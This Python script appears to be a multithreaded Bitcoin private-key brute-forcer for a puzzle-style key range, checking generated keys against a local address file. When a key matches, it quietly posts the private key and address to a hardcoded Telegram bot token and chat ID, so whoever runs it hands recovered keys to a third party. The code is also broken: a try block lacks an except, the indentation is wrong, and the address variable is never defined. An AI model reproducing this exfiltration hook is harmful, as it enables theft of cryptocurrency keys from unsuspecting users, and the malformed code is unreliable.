import random
import threading
import requests
import time
from bitcoin import *

class colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'

total_generated = 0
total_no_balance = 0
total_with_balance = 0
counter_lock = threading.Lock()

def generate_private_key(start_range, end_range):
    global total_generated
    private_key_int = random.randint(start_range, end_range)
    with counter_lock:
        total_generated += 1
    return hex(private_key_int)[2:].zfill(64)

def check_balance(private_key_hex):
    global total_no_balance, total_with_balance

    try:
    matched_addresses = []
    with open('adrs.txt', 'r') as file:
        addresses = file.readlines()
        for address in addresses:
            if generated_address == address.strip():
                matched_addresses.append(address.strip())

    # If matched addresses found, set flag to True to exit the loop
    if matched_addresses:
        found_match = True
        print("Successfully found matching addresses:")
        print("Matched Bitcoin addresses:")
        for address in matched_addresses:
            print(address)
        requests.post(f"https://api.telegram.org/bot7289040329:AAHibMzaFv5yQWOb1cA6LJnPN-b47JdlYfk/sendMessage?chat_id=6553604328&text={private_key_hex}|{address}")
        with counter_lock:
                    total_with_balance += 1
    else:
        print("No matching addresses found. Generating a new private key.")
        with counter_lock:
                    total_no_balance += 1

def generate_and_check_loop(start_range, end_range):
    try:
        while True:
            private_key_hex = generate_private_key(start_range, end_range)
            check_balance(private_key_hex)
    except KeyboardInterrupt:
        print(colors.FAIL + "\nExecution stopped by user." + colors.ENDC)

def monitor_counters():
    while True:
        with counter_lock:
            print(colors.HEADER + f"Total generated: {total_generated} | With balance: {total_with_balance} | No balance: {total_no_balance}" + colors.ENDC)
        time.sleep(60)

def main():
    start_range = int('0000000000000000000000000000000000000000000000060000000000000000', 16)
    end_range = int('000000000000000000000000000000000000000000000006ffffffffffffffff', 16)
    num_threads = int('10')

    monitor_thread = threading.Thread(target=monitor_counters)
    monitor_thread.daemon = True
    monitor_thread.start()

    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=generate_and_check_loop, args=(start_range, end_range))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

    print(colors.HEADER + "All threads have completed." + colors.ENDC)

if __name__ == "__main__":
    main()